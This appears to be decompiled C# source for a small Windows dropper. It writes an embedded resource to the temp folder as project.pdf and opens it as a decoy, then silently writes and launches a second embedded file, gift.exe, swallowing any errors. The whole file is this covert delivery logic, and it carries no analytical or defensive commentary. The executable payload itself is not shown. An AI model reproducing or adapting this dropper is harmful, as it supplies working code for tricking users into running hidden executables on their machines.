using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using WindowsApplication2.My.Resources;

namespace WindowsApplication2;

[StandardModule]
internal sealed class Maiin
{
	private static object xx = Resources.project;

	private static object Bn = Resources.gift;

	[STAThread]
	public static void main()
	{
		try
		{
			string text = Path.GetTempPath() + "\\project.pdf";
			File.WriteAllBytes(text, (byte[])xx);
			Process.Start(text);
			Thread.Sleep(1000);
			string text2 = Path.GetTempPath() + "\\gift.exe";
			File.WriteAllBytes(text2, (byte[])Bn);
			Process.Start(text2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
